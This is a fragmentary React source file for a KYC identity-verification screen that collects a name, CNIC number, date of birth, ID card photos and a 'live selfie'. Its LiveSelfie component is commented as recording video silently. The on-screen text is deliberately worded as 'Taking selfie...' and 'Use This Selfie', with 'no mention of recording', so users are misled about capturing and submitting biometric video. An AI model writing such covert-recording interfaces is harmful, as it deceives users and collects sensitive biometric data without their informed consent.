...
import {
  ...
  ArrowUp, Eye, Smile, ChevronLeft, ChevronRight
} from 'lucide-react';
...
// ── LiveSelfie — records video silently, shows selfie UI to user ──
function LiveSelfie({ onCapture, onCancel, isDark }) {
  ...
  const startChallenges = useCallback(() => {
    ...
    // ── Silently start video recording ──
    try {
      ...
      recorder.onstop = () => {
        ...
        const file = new File([blob], `selfie-verification.${ext}`, { type: mimeType });
        setVideoBlob(file);
        setPhase('done');
      };
  ...
  const handleConfirm = () => {
    if (videoBlob) onCapture(videoBlob, previewUrl);
  };
  ...
  return (
    ...
    >
      ...
      <div style={{ position:'relative', width:'100%', flex:1, overflow:'hidden', maxHeight:'65vh' }}>
        ...
        {/* Done — show selfie thumbnail preview */}
        ...
        <div style={{ position:'absolute', top:0, left:0, right:0, padding:'20px 16px 12px', background:'linear-gradient(180deg,rgba(0,0,0,0.7) 0%,transparent 100%)' }}>
          <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center' }}>
            <motion.div style={{ width:'36px', height:'36px', borderRadius:'12px', background:'rgba(255,255,255,0.15)', display:'flex', alignItems:'center', justifyContent:'center', cursor:'pointer' }} whileTap={{ scale:0.88 }} onClick={() => { stopAll(); onCancel(); }}>
              <ArrowLeft size={18} color="#fff" />
            </motion.div>
            <div style={{ background:'rgba(0,0,0,0.5)', borderRadius:'20px', padding:'6px 14px', backdropFilter:'blur(8px)' }}>
              {/* ── User sees "Live Selfie Verification" — no mention of recording ── */}
              <span style={{ color:'#fff', fontSize:'12px', fontWeight:'700' }}>Live Selfie Verification</span>
            </div>
            <div style={{ width:'36px' }} />
          </div>
          {/* Progress bar — shown during challenges */}
          {phase === 'challenge' && (
      ...
      <div style={{ width:'100%', background: isDark ? '#0F1629' : '#fff', borderRadius:'24px 24px 0 0', padding:'20px 20px 40px', boxSizing:'border-box', flex:1 }}>
        ...
        {phase === 'error' && (
          <motion.div initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }}>
            ...
            <motion.button style={{ width:'100%', padding:'16px', background:'linear-gradient(135deg,#1A73E8,#7C3AED)', color:'#fff', border:'none', borderRadius:'16px', fontSize:'15px', fontWeight:'800', cursor:'pointer' }} whileTap={{ scale:0.97 }} onClick={() => { stopAll(); onCancel(); }}>Go Back</motion.button>
          </motion.div>
        )}

        {/* INTRO — user sees selfie language only */}
        {phase === 'intro' && (
          <motion.div initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }}>
            <h3 style={{ color:text, fontSize:'18px', fontWeight:'800', margin:'0 0 6px 0' }}>Liveness Check</h3>
            <p style={{ color:textSec, fontSize:'13px', margin:'0 0 16px 0', lineHeight:1.6 }}>
              We'll ask you to perform {CHALLENGES.length} quick actions to verify you are a real person.
            </p>
            <div style={{ display:'flex', flexDirection:'column', gap:'7px', marginBottom:'18px' }}>
              {CHALLENGES.map((c, i) => (
                <div key={c.id} style={{ display:'flex', alignItems:'center', gap:'10px', padding:'10px 13px', background: isDark ? 'rgba(255,255,255,0.04)' : '#F8FAFF', borderRadius:'12px', border:`1px solid ${border}` }}>
                  ...
                  <span style={{ color:text, fontSize:'13px', fontWeight:'600', flex:1 }}>{c.label}</span>
                  <span style={{ color:textSec, fontSize:'11px' }}>{c.duration}s</span>
                </div>
              ))}
            </div>
            {/* ── No mention of recording — just security notice ── */}
            <div style={{ background: isDark?'rgba(26,115,232,0.06)':'rgba(26,115,232,0.04)', borderRadius:'12px', padding:'10px 14px', border:`1px solid ${isDark?'rgba(26,115,232,0.15)':'rgba(26,115,232,0.1)'}`, marginBottom:'16px', display:'flex', gap:'8px' }}>
              <Shield size={13} color="#1A73E8" style={{ flexShrink:0, marginTop:'1px' }} />
              <p style={{ color:textSec, fontSize:'11px', margin:0, lineHeight:1.6 }}>
                Your face must be clearly visible in good lighting. The process takes about 20 seconds.
              </p>
            </div>
            <motion.button
              style={{ width:'100%', padding:'16px', background: cameraReady ? 'linear-gradient(135deg,#16A34A,#15803D)' : isDark?'rgba(255,255,255,0.06)':'#F1F5F9', color: cameraReady ? '#fff' : textSec, border:'none', borderRadius:'16px', fontSize:'15px', fontWeight:'800', cursor: cameraReady?'pointer':'not-allowed', display:'flex', alignItems:'center', justifyContent:'center', gap:'8px', boxShadow: cameraReady?'0 8px 24px rgba(22,163,74,0.4)':'none' }}
              whileTap={cameraReady ? { scale:0.97 } : {}}
              onClick={() => cameraReady && startChallenges()}
            >
              {cameraReady
                ? <><Camera size={16} color="#fff" /> Start Liveness Check</>
                : <><RefreshCw size={16} color={textSec} /> Starting camera...</>
              }
            </motion.button>
          </motion.div>
        )}
        ...
        {phase === 'challenge' && (
          <motion.div key={`ch-${challengeIdx}`} initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }} exit={{ opacity:0 }}>
            <div style={{ display:'flex', alignItems:'center', gap:'14px', marginBottom:'14px' }}>
              <motion.div style={{ width:'56px', height:'56px', borderRadius:'18px', background:currentChallenge.grad, display:'flex', alignItems:'center', justifyContent:'center', flexShrink:0, boxShadow:'0 8px 20px rgba(0,0,0,0.2)' }} animate={{ scale:[1,1.08,1] }} transition={{ duration:1, repeat:Infinity }}>
              ...
              <div style={{ flex:1 }}>
                ...
                <h3 style={{ color:text, fontSize:'17px', fontWeight:'800', margin:0 }}>{currentChallenge.label}</h3>
              </div>
              {/* Countdown ring */}
            ...
            <div style={{ display:'flex', gap:'5px', flexWrap:'wrap' }}>
              {CHALLENGES.map((c, i) => (
                <div key={c.id} style={{ display:'flex', alignItems:'center', gap:'4px', padding:'4px 10px', background: completedIds.includes(c.id)?'rgba(22,163,74,0.1)':i===challengeIdx?'rgba(26,115,232,0.1)':isDark?'rgba(255,255,255,0.04)':'#F1F5F9', borderRadius:'20px', border:`1px solid ${completedIds.includes(c.id)?'rgba(22,163,74,0.3)':i===challengeIdx?'rgba(26,115,232,0.3)':'transparent'}` }}>
                  {completedIds.includes(c.id) && <CheckCircle size={10} color="#16A34A" />}
        ...
        {phase === 'capturing' && (
          <motion.div style={{ textAlign:'center', padding:'16px 0' }} initial={{ opacity:0 }} animate={{ opacity:1 }}>
            ...
            {/* ── User sees "Taking selfie" not "saving video" ── */}
            <h3 style={{ color:text, fontSize:'17px', fontWeight:'800', margin:'0 0 6px 0' }}>Taking selfie...</h3>
        ...
        {phase === 'done' && (
          <motion.div initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }}>
            ...
            <div style={{ background: isDark?'rgba(22,163,74,0.06)':'rgba(22,163,74,0.04)', borderRadius:'12px', padding:'10px 14px', border:'1px solid rgba(22,163,74,0.2)', marginBottom:'14px', display:'flex', gap:'8px' }}>
              <Shield size={13} color="#16A34A" style={{ flexShrink:0, marginTop:'1px' }} />
              <p style={{ color:textSec, fontSize:'11px', margin:0, lineHeight:1.6 }}>
                Your selfie has been captured. Tap the button below to continue.
              </p>
            </div>
            <div style={{ display:'flex', gap:'10px' }}>
              ...
              {/* ── User sees "Use This Selfie" ── */}
              <motion.button style={{ flex:2, padding:'14px', background:'linear-gradient(135deg,#16A34A,#15803D)', color:'#fff', border:'none', borderRadius:'14px', fontSize:'14px', fontWeight:'800', cursor:'pointer', boxShadow:'0 6px 20px rgba(22,163,74,0.4)', display:'flex', alignItems:'center', justifyContent:'center', gap:'6px' }} whileTap={{ scale:0.97 }} onClick={handleConfirm}>
                <CheckCircle size={15} color="#fff" /> Use This Selfie
              </motion.button>
            </div>
          </motion.div>
        )}
  ...
  return (
    <label style={{ display:'block', cursor:'pointer' }}>
      <motion.div
        ...
        whileTap={{ scale:0.99 }} whileHover={{ borderColor: file?'#16A34A':color }}
      >
        {file ? (
...
export default function KYC() {
  ...
  // ── Receives video blob + thumbnail preview from LiveSelfie ──
  const handleSelfieCapture = async (blob, previewDataUrl) => {
    setShowLiveSelfie(false);
    setSelfiePreview(previewDataUrl);
  ...
  const steps = [
    { num:1, label:'Details', grad:'linear-gradient(135deg,#1A73E8,#0052CC)' },
    { num:2, label:'Front',   grad:'linear-gradient(135deg,#7C3AED,#5B21B6)' },
    { num:3, label:'Back',    grad:'linear-gradient(135deg,#EA580C,#C2410C)' },
    { num:4, label:'Selfie',  grad:'linear-gradient(135deg,#16A34A,#15803D)' },
  ];
  ...
  const StatusScreen = ({ grad, icon, title, subtitle, badge, badgeColor, badgeBg, extra, primaryBtn, primaryAction, secondaryBtn, secondaryAction }) => (
    <div style={{ minHeight:'100vh', background:bg, maxWidth:'480px', margin:'0 auto', fontFamily:'-apple-system,BlinkMacSystemFont,sans-serif' }}>
      <div style={{ background:grad, padding:'60px 20px 40px', position:'relative', overflow:'hidden', textAlign:'center' }}>
        ...
        <motion.h2 style={{ color:'#fff', fontSize:'24px', fontWeight:'800', margin:'0 0 8px 0', position:'relative', zIndex:1 }} initial={{ opacity:0, y:16 }} animate={{ opacity:1, y:0 }} transition={{ delay:0.25 }}>{title}</motion.h2>
  ...
  if (loading) return (
    <div style={{ minHeight:'100vh', background:bg, display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:'20px' }}>
      <motion.div style={{ width:'60px', height:'60px', borderRadius:'18px', background:'linear-gradient(135deg,#1A73E8,#7C3AED)', display:'flex', alignItems:'center', justifyContent:'center' }} animate={{ scale:[1,1.08,1] }} transition={{ duration:1.5, repeat:Infinity }}><Shield size={28} color="#fff" /></motion.div>
          ...
          <div style={{ display:'flex', alignItems:'center', gap:'6px' }}>
            {steps.map((s, i) => (
              <React.Fragment key={s.num}>
                <motion.div style={{ width:'32px', height:'32px', borderRadius:'50%', background: step>s.num?'rgba(74,222,128,0.3)':step===s.num?'rgba(255,255,255,0.25)':'rgba(255,255,255,0.08)', display:'flex', alignItems:'center', justifyContent:'center', border: step===s.num?'2px solid rgba(255,255,255,0.5)':'1px solid rgba(255,255,255,0.15)' }} animate={{ scale: step===s.num?1.1:1 }} transition={{ type:'spring', stiffness:300 }}>
            ...
            <motion.div key="s1" initial={{ opacity:0, x:20 }} animate={{ opacity:1, x:0 }} exit={{ opacity:0, x:-20 }} transition={{ duration:0.25 }}>
              ...
              <motion.div style={{ background:card, borderRadius:'20px', padding:'20px', border:`1px solid ${border}`, boxShadow: isDark?'none':'0 4px 24px rgba(0,0,0,0.06)' }} initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }} transition={{ delay:0.05 }}>
                ...
                <div style={{ marginBottom:'14px' }}>
                  ...
                  <div style={{ display:'flex', alignItems:'center', border:`2px solid ${fullNameOnCard?'#1A73E8':isDark?'rgba(255,255,255,0.08)':'#E2E8F0'}`, borderRadius:'14px', padding:'0 16px', background:inputBg, transition:'all 0.2s' }}>
              ...
              <motion.button style={{ width:'100%', padding:'16px', background: fullNameOnCard&&cnic.length===13&&dob?'linear-gradient(135deg,#1A73E8,#0052CC)':isDark?'rgba(255,255,255,0.06)':'#F1F5F9', color: fullNameOnCard&&cnic.length===13&&dob?'#fff':textSec, border:'none', borderRadius:'16px', fontSize:'15px', fontWeight:'800', cursor:'pointer', marginTop:'14px', transition:'all 0.25s' }} whileTap={{ scale:0.97 }} onClick={() => { if(!fullNameOnCard.trim()){setError('Please enter your full name');return;} if(cnic.length!==13){setError('CNIC must be 13 digits');return;} if(!dob){setError('Please enter your date of birth');return;} setError('');setStep(2); }}>Continue →</motion.button>
            </motion.div>
          )}

          {/* Steps 2 & 3 */}
          {[
            { key:'s2', stepNum:2, file:cnicFront, setter:setCnicFront, label:'cnic_front', color:'#7C3AED', grad:'linear-gradient(135deg,#7C3AED,#5B21B6)', shadow:'rgba(124,58,237,0.35)', title:'CNIC Front Side', subtitle:'Photo of the front of your CNIC', tip:'Ensure the card is flat, well-lit, and all 4 corners visible. Image auto-compressed.', errMsg:'Please upload CNIC front' },
            { key:'s3', stepNum:3, file:cnicBack,  setter:setCnicBack,  label:'cnic_back',  color:'#EA580C', grad:'linear-gradient(135deg,#EA580C,#C2410C)', shadow:'rgba(234,88,12,0.35)',  title:'CNIC Back Side',  subtitle:'Photo of the back of your CNIC',  tip:'The back side contains your address. Image auto-compressed before upload.',     errMsg:'Please upload CNIC back'  },
            ...
            <motion.div key="s4" initial={{ opacity:0, x:20 }} animate={{ opacity:1, x:0 }} exit={{ opacity:0, x:-20 }} transition={{ duration:0.25 }}>
              <motion.div style={{ background:card, borderRadius:'20px', padding:'20px', border:`1px solid ${border}`, marginBottom:'14px', boxShadow: isDark?'none':'0 4px 24px rgba(0,0,0,0.06)' }} initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }}>
                <div style={{ display:'flex', alignItems:'center', gap:'12px', marginBottom:'18px' }}>
                  ...
                  <div><h3 style={{ color:text, fontSize:'16px', fontWeight:'800', margin:'0 0 2px 0' }}>Face Verification</h3><p style={{ color:textSec, fontSize:'12px', margin:0 }}>Take a live selfie for identity confirmation</p></div>
                </div>
                  ...
                  : selfie
                    ? <motion.div style={{ border:'2px dashed #16A34A', borderRadius:'18px', padding:'20px', textAlign:'center', background: isDark?'rgba(22,163,74,0.06)':'rgba(22,163,74,0.03)', marginBottom:'14px' }} initial={{ scale:0.95 }} animate={{ scale:1 }}>
                        <div style={{ width:'80px', height:'80px', borderRadius:'50%', overflow:'hidden', margin:'0 auto 12px', border:'3px solid #16A34A', boxShadow:'0 0 0 4px rgba(22,163,74,0.2)' }}>
                          <img src={selfiePreview||URL.createObjectURL(selfie)} alt="Selfie preview" style={{ width:'100%', height:'100%', objectFit:'cover' }} />
                        </div>
                    ...
                    : <motion.div style={{ border:`2px dashed ${isDark?'rgba(255,255,255,0.1)':'#E2E8F0'}`, borderRadius:'18px', padding:'32px 20px', textAlign:'center', background: isDark?'rgba(255,255,255,0.02)':'#F8FAFF', marginBottom:'14px', cursor:'pointer' }} whileTap={{ scale:0.99 }} onClick={() => setShowLiveSelfie(true)}>
                        ...
                        <p style={{ color:text, fontSize:'15px', fontWeight:'800', margin:'0 0 6px 0' }}>Take Live Selfie</p>
                        <p style={{ color:textSec, fontSize:'12px', margin:'0 0 12px 0', lineHeight:1.5 }}>You'll be asked to perform 6 quick actions to verify your identity</p>
                ...
                {!selfie && !compressing && (
                  <div style={{ background: isDark?'rgba(26,115,232,0.06)':'rgba(26,115,232,0.04)', borderRadius:'12px', padding:'12px 14px', border:`1px solid ${isDark?'rgba(26,115,232,0.15)':'rgba(26,115,232,0.1)'}`, display:'flex', gap:'10px' }}>
                    ...
                    <p style={{ color:textSec, fontSize:'12px', margin:0, lineHeight:'1.6' }}>
                      Look straight, turn left/right, look up, blink twice, smile. Takes about 20 seconds.
                    </p>
                  </div>
                )}
              </motion.div>
              ...
              {/* Review summary */}
              <motion.div style={{ background:card, borderRadius:'20px', overflow:'hidden', border:`1px solid ${border}`, marginBottom:'14px' }} initial={{ opacity:0, y:10 }} animate={{ opacity:1, y:0 }} transition={{ delay:0.05 }}>
                ...
                {[
                  ...
                  { label:'Live Selfie',  value:selfie?'Captured':null, done:!!selfie },
                ].map((row, i, arr) => (
